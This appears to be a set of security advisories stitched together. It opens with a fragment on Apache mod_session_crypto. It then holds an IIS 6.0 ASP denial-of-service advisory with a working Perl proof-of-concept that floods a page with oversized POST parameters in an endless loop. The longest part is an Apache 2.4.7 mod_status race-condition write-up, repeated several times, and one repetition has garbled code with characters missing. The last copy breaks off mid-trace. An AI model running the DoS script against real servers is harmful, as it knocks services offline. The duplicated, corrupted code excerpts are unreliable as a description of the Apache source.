This\r\navoids server-side session state so that incoming HTTP requests can be\r\neasily distributed amongst a number of application web servers which do\r\nnot need to share session state.\r\n\r\n\r\nMore Details\r\n============\r\n\r\nThe module mod_session_crypto uses symmetric cryptography to encrypt and\r\ndecrypt session data and uses mod_session to store the encrypted data in\r\na cookie (usually called \"session\") within the user's browser. The\r\ndecrypted session is then made available to the application in an\r\nenvironment variable (in case of a CGI script) or in a custom HTTP\r\nrequest header. The application can add a custom HTTP response header\r\n(usually \"X-Replace-Session\") which instructs the HTTP server to replace\r\nthe session's content with the value of the header. Detailed\r\ninstructions to set up mod_session and mod_session_crypto can be found\r\nin the documentation:\r\nhttps://httpd.apache.org/docs/2.4/mod/mod_session.html#basicexamples\r\n\r\nThe module mod_session_crypto is configured to use either 3DES or AES\r\nwith various key sizes, defaulting to AES256.

When the following ASP script is hosted by IIS the attacker can run the\r\nattack:\r\n\r\n\t<%\r\n\t\tDim variable\r\n\t\tvariable = Request.Form(\u201cFOOBAR\u201d)\r\n\t%>\r\n\r\nThis small script reads out a POST request argument from the client side.\r\n\r\nThe exploit is simple: The attacker sends a POST request to the ASP site which reads out\r\nPOST arguments. The POST request includes > 40000 request parameters and is sent in the\r\nform of an application/x-www-form-urlencoded encoding type.\r\n\r\nThe result is that one IIS worker process crashes because of a stack overflow (here stack\r\nexhaustion). Tests have shown that five consecutive requests of this type will cause the\r\ndefault application pool to be disabled because of a series of failures of the IIS worker\r\nprocesses. The IIS shows a \u201cService Unavailable\u201d response to requesting clients until the\r\nWorld Wide Web Publishing Service is restarted manually by the administrator.\r\n\r\n\r\nPoC Exploit\r\n# IIS 6.0 ASP DoS PoC\r\n# usage: perl IISdos.pl <host> <asp page>\r\nuse IO::Socket;\r\n$|=1;\r\n$host = $ARGV[0];\r\n$script = $ARGV[1];\r\nwhile(1) {\r\n$sock = IO::Socket::INET->new(PeerAddr => $host,\r\n                   PeerPort => 'http(80)',\r\n                   Proto => 'tcp');\r\n$write = \"C=A&\" x 40000;\r\nprint $sock \"HEAD /$script HTTP/1.1\\r\\nHost: $host\\r\\n\"\r\n           .\"Connection:Close\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\"\r\n           .\"Content-Length:\". length($write) .\"\\r\\n\\r\\n\" . $write;\r\nprint \".\";\r\nwhile(<$sock>) {\r\n           print;\r\n}\r\n}\r\n\r\n\r\nExploit-DB Notes:\r\nIn our tests, a specific setting has to be modified in metabase.xml in order to trigger the exhaustion.

As comment in 1927 value says, function\r\ncomputes count\r\nof bytes to copy. If there's nothing to escape function uses\r\napr_pmemdup to duplicate\r\nthe str. In our single-threaded mind everything looks good, but tricky\r\npart starts\r\nwhen we introduce multi-threading. Apache in MPM mode runs workers as\r\nthreads, let's\r\nconsider the following scenario:\r\n\r\n    1) ap_escape_logitem(pool, \"\") is called\r\n    2) for-loop in 1921 line immediately escapes, because *s is  in\r\nfirst loop run\r\n    3) malicious thread change memory under *s to another value\r\n(something which is not )\r\n    4) apr_pmemdup copies that change value to new string and returns\r\nit\r\n\r\nOutput from the ap_escape_logitem is considered to be a string, if\r\nscenario above would occur,\r\nthen returned string would not be zeroed at the end, which may be\r\nharmful. The mod_status\r\ncode looks as follows:\r\n\r\n    833                    ap_rprintf(r, \"%s%s\"\r\n    834                                  \"%snn\",\r\n    835                               ap_escape_html(r->pool,\r\n    836                                             \r\nws_record->client),\r\n    837                               ap_escape_html(r->pool,\r\n    838                                             \r\nws_record->vhost),\r\n    839                               ap_escape_html(r->pool,\r\n    840                                             \r\nap_escape_logitem(r->pool,\r\n    841                                                     \r\nws_record->request)));\r\n\r\nThe relevant call to ap_escape_html() is at line 839 after the\r\nevaluation of ap_escape_logitem().\r\nThe first argument passed to the ap_escape_logitem() is in fact an apr\r\npool associated with\r\nthe HTTP request and defined in the request_rec structure.\r\n\r\nThis code is a part of a larger for-loop where code is iterating over\r\nworker_score structs which is\r\ndefined as follows:\r\n\r\n    90struct worker_score {\r\n    91#if APR_HAS_THREADS\r\n    92    apr_os_thread_t tid;\r\n    93#endif\r\n    94    int thread_num;\r\n    95    /* With some MPMs (e.g., worker), a worker_score can\r\nrepresent\r\n    96     * a thread in a terminating process which is no longer\r\n    97     * represented by the corresponding process_score.

This change may occur when the\r\nmod_status is iterating over the workers at the same time the\r\nap_escape_logitem is called within a different\r\nthread, leading to a race condition. We can trigger this exact\r\nscenario in order to return a string without a\r\ntrailing . This can be achived by running two clients, one triggering\r\nthe mod_status handler and second\r\nsending random requests to the web server. Let's consider the\r\nfollowing example:\r\n\r\n    1) the mod_status iterates over workers invoking\r\nupdate_child_status_internal()\r\n    2) at some point for one worker mod_status calls\r\nap_escape_logitem(pool, ws_record->request)\r\n    3) let's asume that ws_record->request at the beginning is \"\"\r\nliterally  at the first byte.\r\n    4) inside the ap_escape_logitem function the length of the\r\nws_record->request is computed, which is 1\r\n       (an empty string consisting of )\r\n    5) another thread modifies ws_record->request (in fact it's called\r\nws->request in update_child_status_internal\r\n       function but it's exactly the same location in memory) and puts\r\nthere i.e. \"GET / HTTP/1.0\"\r\n    6) the ap_pmemdup(pool, str, 1) in ap_escape_logitem copies the\r\nfirst one byte from \"GET / HTTP/1.0\" - \"G\" in\r\n       that case and returns it. The ap_pmemdup looks as follows:\r\n\r\n       112APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void\r\n*m, apr_size_t n)\r\n       113{\r\n       114    void *res;\r\n       115\r\n       116    if (m == NULL)\r\n       117      return NULL;\r\n       118    res = apr_palloc(a, n);\r\n       119    memcpy(res, m, n);\r\n       120    return res;\r\n\r\n       It allocates memory using apr_palloc function which returns\r\n\"ditry\" memory (note that apr_pcalloc overwrite\r\n       allocated memory with NULs).\r\n\r\n       So it's non-deterministic what's after the copied \"G\" byte.\r\nThere might be  or might be not. For now let's\r\n       assume that the memory allocated by apr_palloc was dirty\r\n(containing random bytes).\r\n    7) ap_escape_logitem returns \"G.....\" .junk. \"\"\r\n\r\nThe value from the example above is then pushed to the ap_escape_html2\r\nfunction which is also declared in util.c:\r\n\r\n    1860AP_DECLARE(char *) ap_escape_html2(apr_pool_t *p, const char\r\n*s, int toasc)\r\n    1861{\r\n    1862    int i, j;\r\n    1863    char *x;\r\n    1864\r\n    1865    /* first, count the number of extra characters */\r\n    1866    for (i = 0, j = 0; s[i] != ''; i++)\r\n    1867        if (s[i] == '')\r\n    1868            j += 3;\r\n    1869        else if (s[i] == '&')\r\n    1870            j += 4;\r\n    1871        else if (s[i] == '\"')\r\n    1872            j += 5;\r\n    1873        else if (toasc && !apr_isascii(s[i]))\r\n    1874            j += 5;\r\n    1875\r\n    1876    if (j == 0)\r\n    1877        return apr_pstrmemdup(p, s, i);\r\n    1878\r\n    1879    x = apr_palloc(p, i + j + 1);\r\n    1880    for (i = 0, j = 0; s[i] != ''; i++, j++)\r\n    1881        if (s[i] == '') {\r\n    1886            memcpy(&x[j], \">\", 4);\r\n    1887            j += 3;\r\n    1888        }\r\n    1889        else if (s[i] == '&') {\r\n    1890            memcpy(&x[j], \"&\", 5);\r\n    1891            j += 4;\r\n    1892        }\r\n    1893        else if (s[i] == '\"') {\r\n    1894            memcpy(&x[j], \"\"\", 6);\r\n    1895            j += 5;\r\n    1896        }\r\n    1897        else if (toasc && !apr_isascii(s[i])) {\r\n    1898            char *esc = apr_psprintf(p, \"&#%3.3d;\", (unsigned\r\nchar)s[i]);\r\n    1899            memcpy(&x[j], esc, 6);\r\n    1900            j += 5;\r\n    1901        }\r\n    1902        else\r\n    1903            x[j] = s[i];\r\n    1904\r\n    1905    x[j] = '';\r\n    1906    return x;\r\n    1907}\r\n\r\nIf the string from the example above would be passed to this function\r\nwe should get the following code-flow:\r\n\r\n    1) in the for-loop started in line 1866 we count the length of\r\nescaped string\r\n    2) because 's' string contains junk (due to only one byte being\r\nallocated by the apr_palloc function),\r\n       it may contain '>' character. Let's assume that this is our\r\ncase\r\n    3) after for-loop in 1866 line 'j' is greater than 0 (at least one\r\ns[i] equals '>' as assumed above\r\n    4) in the 1879 line memory for escaped 'd' string is allocated\r\n    5) for-loop started in line 1880 copies string 's' to the escaped\r\n'd' string BUT apr_palloc has allocated\r\n       only one byte for 's'. Thus, for each i > 0 the loop reads\r\nrandom memory and copies that value\r\n       to 'd' string. At this point it's possible to trigger an\r\ninformation leak vulnerability (see section 5).\r\n\r\nHowever the 's' string may overlap with 'd' i.e.:\r\n\r\n    's' is allocated under 0 with contents s = \"AAAAAAAA>\"\r\n    'd' is allocated under 8 then s[8] = d[0].\r\n\r\nIf that would be the case, then for-loop would run forever (s[i] never\r\nwould be  since it was overwritten in the loop\r\nby non-zero). Forever... until it hits an unmapped memory or read only\r\narea.\r\n\r\nPart of the scoreboard.c code which may overwrite the\r\nws_record->request was discovered using a tsan:\r\n\r\n    #1 ap_escape_logitem ??:0 (exe+0x0000000411f2)\r\n    #2 status_handler\r\n/home/akat-1/src/httpd-2.4.7/modules/generators/mod_status.c:839\r\n(mod_status.so+0x0000000044b0)\r\n    #3 ap_run_handler ??:0 (exe+0x000000084d98)\r\n    #4 ap_invoke_handler ??:0 (exe+0x00000008606e)\r\n    #5 ap_process_async_request ??:0 (exe+0x0000000b7ed9)\r\n    #6 ap_process_http_async_connection http_core.c:0\r\n(exe+0x0000000b143e)\r\n    #7 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #8 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #9 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #10 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #11 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #12  :0 (libtsan.so.0+0x00000001b279)\r\n\r\n  Previous write of size 1 at 0x7feff2b862b8 by thread T2:\r\n    #0 update_child_status_internal scoreboard.c:0\r\n(exe+0x00000004d4c6)\r\n    #1 ap_update_child_status_from_conn ??:0 (exe+0x00000004d693)\r\n    #2 ap_process_http_async_connection http_core.c:0\r\n(exe+0x0000000b139a)\r\n    #3 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #4 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #5 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #6 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #7 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #8  :0 (libtsan.so.0+0x00000001b279)\r\n--[ 3.

Sparse summary   \nRace condition between updating httpd's \"scoreboard\" and mod_status,   \nleading to several critical scenarios like heap buffer overflow with user   \nsupplied payload and leaking heap which can leak critical memory containing   \nhtaccess credentials, ssl certificates private keys and so on.   \n  \n  \n--[ 1. Prerequisites  \n  \nApache httpd compiled with MPM event or MPM worker.  \nThe tested version was 2.4.7 compiled with:  \n  \n./configure --enable-mods-shared=reallyall --with-included-apr  \n  \nThe tested mod_status configuration in httpd.conf was:  \n  \n<Location /foo>  \nSetHandler server-status  \n</Location>  \nExtendedStatus On  \n  \n  \n--[ 2. Race Condition  \n  \nFunction ap_escape_logitem in server/util.c looks as follows:  \n  \n1908AP_DECLARE(char *) ap_escape_logitem(apr_pool_t *p, const char *str)  \n1909{  \n1910 char *ret;  \n1911 unsigned char *d;  \n1912 const unsigned char *s;  \n1913 apr_size_t length, escapes = 0;  \n1914  \n1915 if (!str) {  \n1916 return NULL;  \n1917 }  \n1918  \n1919 /* Compute how many characters need to be escaped */  \n1920 s = (const unsigned char *)str;  \n1921 for (; *s; ++s) {  \n1922 if (TEST_CHAR(*s, T_ESCAPE_LOGITEM)) {  \n1923 escapes++;  \n1924 }  \n1925 }  \n1926  \n1927 /* Compute the length of the input string, including NULL */  \n1928 length = s - (const unsigned char *)str + 1;  \n1929  \n1930 /* Fast path: nothing to escape */  \n1931 if (escapes == 0) {  \n1932 return apr_pmemdup(p, str, length);  \n1933 }  \n  \nIn the for-loop between 1921 and 1925 lines function is computing the length of  \nsupplied str (almost like strlen, but additionally it counts special characters  \nwhich need to be escaped). As comment in 1927 value says, function computes count  \nof bytes to copy. If there's nothing to escape function uses apr_pmemdup to duplicate  \nthe str. In our single-threaded mind everything looks good, but tricky part starts  \nwhen we introduce multi-threading. Apache in MPM mode runs workers as threads, let's  \nconsider the following scenario:  \n  \n1) ap_escape_logitem(pool, \"\") is called  \n2) for-loop in 1921 line immediately escapes, because *s is \\0 in first loop run  \n3) malicious thread change memory under *s to another value (something which is not \\0)  \n4) apr_pmemdup copies that change value to new string and returns it  \n  \nOutput from the ap_escape_logitem is considered to be a string, if scenario above would occur,  \nthen returned string would not be zeroed at the end, which may be harmful. The mod_status  \ncode looks as follows:  \n  \n833 ap_rprintf(r, \"</td><td>%s</td><td nowrap>%s</td>\"  \n834 \"<td nowrap>%s</td></tr>\\n\\n\",  \n835 ap_escape_html(r->pool,  \n836 ws_record->client),  \n837 ap_escape_html(r->pool,  \n838 ws_record->vhost),  \n839 ap_escape_html(r->pool,  \n840 ap_escape_logitem(r->pool,  \n841 ws_record->request)));  \n  \nThe relevant call to ap_escape_html() is at line 839 after the evaluation of ap_escape_logitem().  \nThe first argument passed to the ap_escape_logitem() is in fact an apr pool associated with  \nthe HTTP request and defined in the request_rec structure.  \n  \nThis code is a part of a larger for-loop where code is iterating over worker_score structs which is  \ndefined as follows:  \n  \n90struct worker_score {  \n91#if APR_HAS_THREADS  \n92 apr_os_thread_t tid;  \n93#endif  \n94 int thread_num;  \n95 /* With some MPMs (e.g., worker), a worker_score can represent  \n96 * a thread in a terminating process which is no longer  \n97 * represented by the corresponding process_score. These MPMs  \n98 * should set pid and generation fields in the worker_score.  \n99 */  \n100 pid_t pid;  \n101 ap_generation_t generation;  \n102 unsigned char status;  \n103 unsigned short conn_count;  \n104 apr_off_t conn_bytes;  \n105 unsigned long access_count;  \n106 apr_off_t bytes_served;  \n107 unsigned long my_access_count;  \n108 apr_off_t my_bytes_served;  \n109 apr_time_t start_time;  \n110 apr_time_t stop_time;  \n111 apr_time_t last_used;  \n112#ifdef HAVE_TIMES  \n113 struct tms times;  \n114#endif  \n115 char client[40]; /* Keep 'em small... but large enough to hold an IPv6 address */  \n116 char request[64]; /* We just want an idea... */  \n117 char vhost[32]; /* What virtual host is being accessed? */  \n118};  \n  \nThe 'request' field in a worker_score structure is particularly interesting - this field can be changed inside  \nthe copy_request function, which is called by the update_child_status_internal. This change may occur when the  \nmod_status is iterating over the workers at the same time the ap_escape_logitem is called within a different  \nthread, leading to a race condition. We can trigger this exact scenario in order to return a string without a  \ntrailing \\0. This can be achived by running two clients, one triggering the mod_status handler and second  \nsending random requests to the web server. Let's consider the following example:  \n  \n1) the mod_status iterates over workers invoking update_child_status_internal()  \n2) at some point for one worker mod_status calls ap_escape_logitem(pool, ws_record->request)  \n3) let's asume that ws_record->request at the beginning is \"\" literally \\0 at the first byte.  \n4) inside the ap_escape_logitem function the length of the ws_record->request is computed, which is 1  \n(an empty string consisting of \\0)  \n5) another thread modifies ws_record->request (in fact it's called ws->request in update_child_status_internal  \nfunction but it's exactly the same location in memory) and puts there i.e. \"GET / HTTP/1.0\"  \n6) the ap_pmemdup(pool, str, 1) in ap_escape_logitem copies the first one byte from \"GET / HTTP/1.0\" - \"G\" in  \nthat case and returns it. The ap_pmemdup looks as follows:  \n  \n112APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void *m, apr_size_t n)  \n113{  \n114 void *res;  \n115  \n116 if (m == NULL)  \n117 return NULL;  \n118 res = apr_palloc(a, n);  \n119 memcpy(res, m, n);  \n120 return res;  \n  \nIt allocates memory using apr_palloc function which returns \"ditry\" memory (note that apr_pcalloc overwrite  \nallocated memory with NULs).  \n  \nSo it's non-deterministic what's after the copied \"G\" byte. There might be \\0 or might be not. For now let's  \nassume that the memory allocated by apr_palloc was dirty (containing random bytes).  \n7) ap_escape_logitem returns \"G.....\" .junk. \"\\0\"  \n  \nThe value from the example above is then pushed to the ap_escape_html2 function which is also declared in util.c:  \n  \n1860AP_DECLARE(char *) ap_escape_html2(apr_pool_t *p, const char *s, int toasc)  \n1861{  \n1862 int i, j;  \n1863 char *x;  \n1864  \n1865 /* first, count the number of extra characters */  \n1866 for (i = 0, j = 0; s[i] != '\\0'; i++)  \n1867 if (s[i] == '<' || s[i] == '>')  \n1868 j += 3;  \n1869 else if (s[i] == '&')  \n1870 j += 4;  \n1871 else if (s[i] == '\"')  \n1872 j += 5;  \n1873 else if (toasc && !apr_isascii(s[i]))  \n1874 j += 5;  \n1875  \n1876 if (j == 0)  \n1877 return apr_pstrmemdup(p, s, i);  \n1878  \n1879 x = apr_palloc(p, i + j + 1);  \n1880 for (i = 0, j = 0; s[i] != '\\0'; i++, j++)  \n1881 if (s[i] == '<') {  \n1882 memcpy(&x[j], \"<\", 4);  \n1883 j += 3;  \n1884 }  \n1885 else if (s[i] == '>') {  \n1886 memcpy(&x[j], \">\", 4);  \n1887 j += 3;  \n1888 }  \n1889 else if (s[i] == '&') {  \n1890 memcpy(&x[j], \"&\", 5);  \n1891 j += 4;  \n1892 }  \n1893 else if (s[i] == '\"') {  \n1894 memcpy(&x[j], \"\"\", 6);  \n1895 j += 5;  \n1896 }  \n1897 else if (toasc && !apr_isascii(s[i])) {  \n1898 char *esc = apr_psprintf(p, \"&#%3.3d;\", (unsigned char)s[i]);  \n1899 memcpy(&x[j], esc, 6);  \n1900 j += 5;  \n1901 }  \n1902 else  \n1903 x[j] = s[i];  \n1904  \n1905 x[j] = '\\0';  \n1906 return x;  \n1907}  \n  \nIf the string from the example above would be passed to this function we should get the following code-flow:  \n  \n1) in the for-loop started in line 1866 we count the length of escaped string  \n2) because 's' string contains junk (due to only one byte being allocated by the apr_palloc function),  \nit may contain '>' character. Let's assume that this is our case  \n3) after for-loop in 1866 line 'j' is greater than 0 (at least one s[i] equals '>' as assumed above  \n4) in the 1879 line memory for escaped 'd' string is allocated  \n5) for-loop started in line 1880 copies string 's' to the escaped 'd' string BUT apr_palloc has allocated  \nonly one byte for 's'. Thus, for each i > 0 the loop reads random memory and copies that value  \nto 'd' string. At this point it's possible to trigger an information leak vulnerability (see section 5).  \n  \nHowever the 's' string may overlap with 'd' i.e.:  \n  \n's' is allocated under 0 with contents s = \"AAAAAAAA>\\0\"  \n'd' is allocated under 8 then s[8] = d[0].  \n  \nIf that would be the case, then for-loop would run forever (s[i] never would be \\0 since it was overwritten in the loop  \nby non-zero). Forever... until it hits an unmapped memory or read only area.  \n  \nPart of the scoreboard.c code which may overwrite the ws_record->request was discovered using a tsan:  \n  \n#1 ap_escape_logitem ??:0 (exe+0x0000000411f2)  \n#2 status_handler /home/akat-1/src/httpd-2.4.7/modules/generators/mod_status.c:839 (mod_status.so+0x0000000044b0)  \n#3 ap_run_handler ??:0 (exe+0x000000084d98)  \n#4 ap_invoke_handler ??:0 (exe+0x00000008606e)  \n#5 ap_process_async_request ??:0 (exe+0x0000000b7ed9)  \n#6 ap_process_http_async_connection http_core.c:0 (exe+0x0000000b143e)  \n#7 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)  \n#8 ap_run_process_connection ??:0 (exe+0x00000009d156)  \n#9 process_socket event.c:0 (exe+0x0000000cc65e)  \n#10 worker_thread event.c:0 (exe+0x0000000d0945)  \n#11 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)  \n#12 <null> <null>:0 (libtsan.so.0+0x00000001b279)  \n  \nPrevious write of size 1 at 0x7feff2b862b8 by thread T2:  \n#0 update_child_status_internal scoreboard.c:0 (exe+0x00000004d4c6)  \n#1 ap_update_child_status_from_conn ??:0 (exe+0x00000004d693)  \n#2 ap_process_http_async_connection http_core.c:0 (exe+0x0000000b139a)  \n#3 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)  \n#4 ap_run_process_connection ??:0 (exe+0x00000009d156)  \n#5 process_socket event.c:0 (exe+0x0000000cc65e)  \n#6 worker_thread event.c:0 (exe+0x0000000d0945)  \n#7 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)  \n#8 <null> <null>:0 (libtsan.so.0+0x00000001b279)  \n  \n  \n--[ 3.

Race Condition\r\n \r\nFunction ap_escape_logitem in server/util.c looks as follows:\r\n \r\n    1908AP_DECLARE(char *) ap_escape_logitem(apr_pool_t *p, const char\r\n*str)\r\n    1909{\r\n    1910    char *ret;\r\n    1911    unsigned char *d;\r\n    1912    const unsigned char *s;\r\n    1913    apr_size_t length, escapes = 0;\r\n    1914\r\n    1915    if (!str) {\r\n    1916        return NULL;\r\n    1917    }\r\n    1918\r\n    1919    /* Compute how many characters need to be escaped */\r\n    1920    s = (const unsigned char *)str;\r\n    1921    for (; *s; ++s) {\r\n    1922        if (TEST_CHAR(*s, T_ESCAPE_LOGITEM)) {\r\n    1923            escapes++;\r\n    1924        }\r\n    1925    }\r\n    1926\r\n    1927    /* Compute the length of the input string, including NULL\r\n*/\r\n    1928    length = s - (const unsigned char *)str + 1;\r\n    1929\r\n    1930    /* Fast path: nothing to escape */\r\n    1931    if (escapes == 0) {\r\n    1932        return apr_pmemdup(p, str, length);\r\n    1933    }\r\n \r\nIn the for-loop between 1921 and 1925 lines function is computing the\r\nlength of\r\nsupplied str (almost like strlen, but additionally it counts special\r\ncharacters\r\nwhich need to be escaped). As comment in 1927 value says, function\r\ncomputes count\r\nof bytes to copy. If there's nothing to escape function uses\r\napr_pmemdup to duplicate\r\nthe str. In our single-threaded mind everything looks good, but tricky\r\npart starts\r\nwhen we introduce multi-threading. Apache in MPM mode runs workers as\r\nthreads, let's\r\nconsider the following scenario:\r\n \r\n    1) ap_escape_logitem(pool, \"\") is called\r\n    2) for-loop in 1921 line immediately escapes, because *s is  in\r\nfirst loop run\r\n    3) malicious thread change memory under *s to another value\r\n(something which is not )\r\n    4) apr_pmemdup copies that change value to new string and returns\r\nit\r\n \r\nOutput from the ap_escape_logitem is considered to be a string, if\r\nscenario above would occur,\r\nthen returned string would not be zeroed at the end, which may be\r\nharmful. The mod_status\r\ncode looks as follows:\r\n \r\n    833                    ap_rprintf(r, \"%s%s\"\r\n    834                                  \"%snn\",\r\n    835                               ap_escape_html(r->pool,\r\n    836                                            \r\nws_record->client),\r\n    837                               ap_escape_html(r->pool,\r\n    838                                            \r\nws_record->vhost),\r\n    839                               ap_escape_html(r->pool,\r\n    840                                            \r\nap_escape_logitem(r->pool,\r\n    841                                                    \r\nws_record->request)));\r\n \r\nThe relevant call to ap_escape_html() is at line 839 after the\r\nevaluation of ap_escape_logitem().\r\nThe first argument passed to the ap_escape_logitem() is in fact an apr\r\npool associated with\r\nthe HTTP request and defined in the request_rec structure.\r\n \r\nThis code is a part of a larger for-loop where code is iterating over\r\nworker_score structs which is\r\ndefined as follows:\r\n \r\n    90struct worker_score {\r\n    91#if APR_HAS_THREADS\r\n    92    apr_os_thread_t tid;\r\n    93#endif\r\n    94    int thread_num;\r\n    95    /* With some MPMs (e.g., worker), a worker_score can\r\nrepresent\r\n    96     * a thread in a terminating process which is no longer\r\n    97     * represented by the corresponding process_score.  These\r\nMPMs\r\n    98     * should set pid and generation fields in the worker_score.\r\n    99     */\r\n    100    pid_t pid;\r\n    101    ap_generation_t generation;\r\n    102    unsigned char status;\r\n    103    unsigned short conn_count;\r\n    104    apr_off_t     conn_bytes;\r\n    105    unsigned long access_count;\r\n    106    apr_off_t     bytes_served;\r\n    107    unsigned long my_access_count;\r\n    108    apr_off_t     my_bytes_served;\r\n    109    apr_time_t start_time;\r\n    110    apr_time_t stop_time;\r\n    111    apr_time_t last_used;\r\n    112#ifdef HAVE_TIMES\r\n    113    struct tms times;\r\n    114#endif\r\n    115    char client[40];            /* Keep 'em small... but large\r\nenough to hold an IPv6 address */\r\n    116    char request[64];           /* We just want an idea... */\r\n    117    char vhost[32];             /* What virtual host is being\r\naccessed? */\r\n    118};\r\n \r\nThe 'request' field in a worker_score structure is particularly\r\ninteresting - this field can be changed inside\r\nthe copy_request function, which is called by the\r\nupdate_child_status_internal. This change may occur when the\r\nmod_status is iterating over the workers at the same time the\r\nap_escape_logitem is called within a different\r\nthread, leading to a race condition. We can trigger this exact\r\nscenario in order to return a string without a\r\ntrailing . This can be achived by running two clients, one triggering\r\nthe mod_status handler and second\r\nsending random requests to the web server. Let's consider the\r\nfollowing example:\r\n \r\n    1) the mod_status iterates over workers invoking\r\nupdate_child_status_internal()\r\n    2) at some point for one worker mod_status calls\r\nap_escape_logitem(pool, ws_record->request)\r\n    3) let's asume that ws_record->request at the beginning is \"\"\r\nliterally  at the first byte.\r\n    4) inside the ap_escape_logitem function the length of the\r\nws_record->request is computed, which is 1\r\n       (an empty string consisting of )\r\n    5) another thread modifies ws_record->request (in fact it's called\r\nws->request in update_child_status_internal\r\n       function but it's exactly the same location in memory) and puts\r\nthere i.e. \"GET / HTTP/1.0\"\r\n    6) the ap_pmemdup(pool, str, 1) in ap_escape_logitem copies the\r\nfirst one byte from \"GET / HTTP/1.0\" - \"G\" in\r\n       that case and returns it. The ap_pmemdup looks as follows:\r\n \r\n       112APR_DECLARE(void *) apr_pmemdup(apr_pool_t *a, const void\r\n*m, apr_size_t n)\r\n       113{\r\n       114    void *res;\r\n       115\r\n       116    if (m == NULL)\r\n       117      return NULL;\r\n       118    res = apr_palloc(a, n);\r\n       119    memcpy(res, m, n);\r\n       120    return res;\r\n \r\n       It allocates memory using apr_palloc function which returns\r\n\"ditry\" memory (note that apr_pcalloc overwrite\r\n       allocated memory with NULs).\r\n \r\n       So it's non-deterministic what's after the copied \"G\" byte.\r\nThere might be  or might be not. For now let's\r\n       assume that the memory allocated by apr_palloc was dirty\r\n(containing random bytes).\r\n    7) ap_escape_logitem returns \"G.....\" .junk. \"\"\r\n \r\nThe value from the example above is then pushed to the ap_escape_html2\r\nfunction which is also declared in util.c:\r\n \r\n    1860AP_DECLARE(char *) ap_escape_html2(apr_pool_t *p, const char\r\n*s, int toasc)\r\n    1861{\r\n    1862    int i, j;\r\n    1863    char *x;\r\n    1864\r\n    1865    /* first, count the number of extra characters */\r\n    1866    for (i = 0, j = 0; s[i] != ''; i++)\r\n    1867        if (s[i] == '')\r\n    1868            j += 3;\r\n    1869        else if (s[i] == '&')\r\n    1870            j += 4;\r\n    1871        else if (s[i] == '\"')\r\n    1872            j += 5;\r\n    1873        else if (toasc && !apr_isascii(s[i]))\r\n    1874            j += 5;\r\n    1875\r\n    1876    if (j == 0)\r\n    1877        return apr_pstrmemdup(p, s, i);\r\n    1878\r\n    1879    x = apr_palloc(p, i + j + 1);\r\n    1880    for (i = 0, j = 0; s[i] != ''; i++, j++)\r\n    1881        if (s[i] == '') {\r\n    1886            memcpy(&x[j], \">\", 4);\r\n    1887            j += 3;\r\n    1888        }\r\n    1889        else if (s[i] == '&') {\r\n    1890            memcpy(&x[j], \"&\", 5);\r\n    1891            j += 4;\r\n    1892        }\r\n    1893        else if (s[i] == '\"') {\r\n    1894            memcpy(&x[j], \"\"\", 6);\r\n    1895            j += 5;\r\n    1896        }\r\n    1897        else if (toasc && !apr_isascii(s[i])) {\r\n    1898            char *esc = apr_psprintf(p, \"&#%3.3d;\", (unsigned\r\nchar)s[i]);\r\n    1899            memcpy(&x[j], esc, 6);\r\n    1900            j += 5;\r\n    1901        }\r\n    1902        else\r\n    1903            x[j] = s[i];\r\n    1904\r\n    1905    x[j] = '';\r\n    1906    return x;\r\n    1907}\r\n \r\nIf the string from the example above would be passed to this function\r\nwe should get the following code-flow:\r\n \r\n    1) in the for-loop started in line 1866 we count the length of\r\nescaped string\r\n    2) because 's' string contains junk (due to only one byte being\r\nallocated by the apr_palloc function),\r\n       it may contain '>' character. Let's assume that this is our\r\ncase\r\n    3) after for-loop in 1866 line 'j' is greater than 0 (at least one\r\ns[i] equals '>' as assumed above\r\n    4) in the 1879 line memory for escaped 'd' string is allocated\r\n    5) for-loop started in line 1880 copies string 's' to the escaped\r\n'd' string BUT apr_palloc has allocated\r\n       only one byte for 's'. Thus, for each i > 0 the loop reads\r\nrandom memory and copies that value\r\n       to 'd' string. At this point it's possible to trigger an\r\ninformation leak vulnerability (see section 5).\r\n \r\nHowever the 's' string may overlap with 'd' i.e.:\r\n \r\n    's' is allocated under 0 with contents s = \"AAAAAAAA>\"\r\n    'd' is allocated under 8 then s[8] = d[0].\r\n \r\nIf that would be the case, then for-loop would run forever (s[i] never\r\nwould be  since it was overwritten in the loop\r\nby non-zero). Forever... until it hits an unmapped memory or read only\r\narea.\r\n \r\nPart of the scoreboard.c code which may overwrite the\r\nws_record->request was discovered using a tsan:\r\n \r\n    #1 ap_escape_logitem ??:0 (exe+0x0000000411f2)\r\n    #2 status_handler\r\n/home/akat-1/src/httpd-2.4.7/modules/generators/mod_status.c:839\r\n(mod_status.so+0x0000000044b0)\r\n    #3 ap_run_handler ??:0 (exe+0x000000084d98)\r\n    #4 ap_invoke_handler ??:0 (exe+0x00000008606e)\r\n    #5 ap_process_async_request ??:0 (exe+0x0000000b7ed9)\r\n    #6 ap_process_http_async_connection http_core.c:0\r\n(exe+0x0000000b143e)\r\n    #7 ap_process_http_connection http_core.c:0 (exe+0x0000000b177f)\r\n    #8 ap_run_process_connection ??:0 (exe+0x00000009d156)\r\n    #9 process_socket event.c:0 (exe+0x0000000cc65e)\r\n    #10 worker_thread event.c:0 (exe+0x0000000d0945)\r\n    #11 dummy_worker thread.c:0 (libapr-1.so.0+0x00000004bb57)\r\n    #12  :0 (libtsan.so.0+0x00000001b279)\r\n \r\n  Previous write of size 1 at 0x7feff2b862b8 by thread T2:\r\n    #0 update_child_status_internal scoreboard.c:0\r\n(exe+0x00000004d4c6)\r\n    #1 ap_update_child_status_from_conn ??:0 (exe+0x00000004d693)\r\n    #2 ap_process_http_async_connection 